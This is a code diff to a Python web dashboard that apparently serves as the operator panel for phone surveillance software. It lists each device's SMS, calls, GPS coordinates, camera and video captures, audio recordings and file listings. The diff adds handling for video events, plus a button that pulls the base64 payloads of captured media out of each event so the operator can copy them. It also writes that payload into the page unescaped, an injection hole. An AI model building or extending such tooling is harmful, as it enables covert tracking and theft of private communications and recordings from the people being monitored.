@@ -43,7 +43,7 @@ def get_event_category(event_type):
         return 'call'
     elif 'location' in t:
         return 'location'
-    elif 'photo' in t or 'camera' in t or 'capture' in t:
+    elif 'photo' in t or 'camera' in t or 'capture' in t or 'video' in t:
         return 'camera'
     elif 'audio' in t or 'record' in t or 'mic' in t:
         return 'audio'
@@ -51,6 +51,16 @@ def get_event_category(event_type):
         return 'file'
     else:
         return 'other'
+
+def extract_base64_data(event_data):
+    """Extract base64 string from event data dictionary if present."""
+    if not isinstance(event_data, dict):
+        return None
+    for key in ['base64_data', 'base64', 'file_base64', 'audio_base64', 'video_base64', 'photo_base64', 'image_base64', 'content_base64']:
+        val = event_data.get(key)
+        if val and isinstance(val, str) and len(val) > 0:
+            return val
+    return None
 
 CATEGORY_META = {
     'sms': ('sms', '💬'),
@@ -139,7 +149,7 @@ def dashboard():
     events_html_list = []
     displayed_count = 0
     
-    for event in reversed(entries):
+    for idx, event in enumerate(reversed(entries)):
         event_type = str(event.get('type', 'unknown'))
         category = get_event_category(event_type)
         css_class, icon = CATEGORY_META.get(category, ('other', '📋'))
@@ -168,7 +178,7 @@ def dashboard():
             lat = event_data.get('latitude', '?')
             lon = event_data.get('longitude', '?')
             summary = f"Lat: {lat}, Lon: {lon}<br>Accuracy: {event_data.get('accuracy_meters', 'N/A')}m"
-        elif 'photo' in t_lower or 'camera' in t_lower or 'capture' in t_lower:
+        elif 'photo' in t_lower or 'camera' in t_lower or 'capture' in t_lower or 'video' in t_lower:
             file_name = event_data.get('file_name', 'unknown')
             file_size = event_data.get('file_size', 0)
             summary = f"File: {file_name}<br>Size: {format_size(file_size)}"
@@ -180,6 +190,22 @@ def dashboard():
             summary = f"Path: {event_data.get('directory_path', event_data.get('path', 'Unknown'))}<br>Files: {event_data.get('file_count', 'N/A')}"
         else:
             summary = raw_json_str
+
+        # Check for Base64 content
+        base64_val = extract_base64_data(event_data)
+        b64_html = ''
+        
+        if base64_val:
+            b64_html = f'''
+            <div class="b64-actions">
+                <button class="copy-b64-btn" onclick="copyBase64('b64-{idx}', this)">📋 Copy Base64 Data</button>
+                <textarea id="b64-{idx}" class="b64-textarea" readonly>{base64_val}</textarea>
+            </div>'''
+        elif category in ['audio', 'camera', 'file'] or any(k in t_lower for k in ['audio', 'video', 'record', 'camera', 'photo', 'capture']):
+            b64_html = '''
+            <div class="b64-actions">
+                <button class="copy-b64-btn disabled" disabled title="No Base64 payload in this event">📋 No Base64 Data</button>
+            </div>'''
         
         events_html_list.append(f'''
         <div class="event {css_class}">
@@ -190,6 +216,7 @@ def dashboard():
             </div>
             <div class="timestamp">📱 {device_id} | 🕐 Client: {timestamp} | 🖥️ Server: {server_time}</div>
             <div class="summary">{summary}</div>
+            {b64_html}
             <details class="raw-data">
                 <summary>📄 Raw JSON</summary>
                 <pre>{raw_json_str}</pre>
@@ -399,6 +426,44 @@ def dashboard():
             background: #080808;
             border-radius: 4px;
         }}
+
+        /* Base64 Copy Button Styles */
+        .b64-actions {{
+            margin: 8px 0;
+        }}
+        .copy-b64-btn {{
+            background: #111;
+            color: #0f0;
+            border: 1px solid #0f0;
+            padding: 6px 14px;
+            font-family: monospace;
+            font-size: 0.8rem;
+            cursor: pointer;
+            border-radius: 4px;
+            transition: all 0.2s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+        }}
+        .copy-b64-btn:hover:not(.disabled) {{
+            background: #0f0;
+            color: #0a0a0a;
+            box-shadow: 0 0 8px rgba(0,255,0,0.4);
+        }}
+        .copy-b64-btn.copied {{
+            background: #0f0 !important;
+            color: #0a0a0a !important;
+            font-weight: bold;
+        }}
+        .copy-b64-btn.disabled {{
+            border-color: #333;
+            color: #555;
+            cursor: not-allowed;
+        }}
+        .b64-textarea {{
+            display: none;
+        }}
+
         .raw-data {{
             margin-top: 8px;
         }}
@@ -488,6 +553,47 @@ def dashboard():
         if (urlParams.get('auto') === 'true') {{
             document.getElementById('autoRefresh').checked = true;
             toggleAutoRefresh();
+        }}
+
+        function copyBase64(elementId, btn) {{
+            const el = document.getElementById(elementId);
+            if (!el) return;
+            const text = el.value || el.innerText;
+            if (!text) {{
+                alert('No Base64 data found.');
+                return;
+            }}
+            
+            function setCopied() {{
+                const originalText = btn.innerText;
+                btn.innerText = '✓ Copied Base64!';
+                btn.classList.add('copied');
+                setTimeout(() => {{
+                    btn.innerText = originalText;
+                    btn.classList.remove('copied');
+                }}, 2000);
+            }}
+
+            if (navigator.clipboard && navigator.clipboard.writeText) {{
+                navigator.clipboard.writeText(text).then(setCopied).catch(err => {{
+                    fallbackCopy(el, setCopied);
+                }});
+            }} else {{
+                fallbackCopy(el, setCopied);
+            }}
+        }}
+
+        function fallbackCopy(el, callback) {{
+            try {{
+                const prevDisplay = el.style.display;
+                el.style.display = 'block';
+                el.select();
+                document.execCommand('copy');
+                el.style.display = prevDisplay;
+                callback();
+            }} catch (e) {{
+                alert('Failed to copy Base64 data: ' + e);
+            }}
         }}
     </script>
 </body>
